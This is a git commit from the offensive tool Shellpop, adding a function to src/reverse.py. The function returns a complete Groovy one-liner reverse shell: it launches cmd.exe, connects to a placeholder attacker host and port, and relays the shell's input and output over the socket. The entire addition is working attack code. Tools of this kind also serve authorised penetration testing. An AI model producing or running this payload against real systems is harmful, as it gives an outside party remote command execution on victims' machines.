b9f7048b593c8a6f4c6b3d05419fd7303058a206
zc00l <andre.marques@esecurity.com.br>
2018-05-14 10:31:38 -0400

    Adding a groovy reverse shell to Shellpop

--- src/reverse.py
+++ src/reverse.py
@@ -162,3 +162,7 @@ def REVERSE_POWERSHELL_NISHANG_TCP():
     }
 }
 Invoke-PowerShellTcp -Reverse -IPAddress TARGET -Port PORT"""
+
+def REVERSE_GROOVY_TCP():
+    return """groovysh -e 'String host="TARGET";int port=PORT;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'"""
+
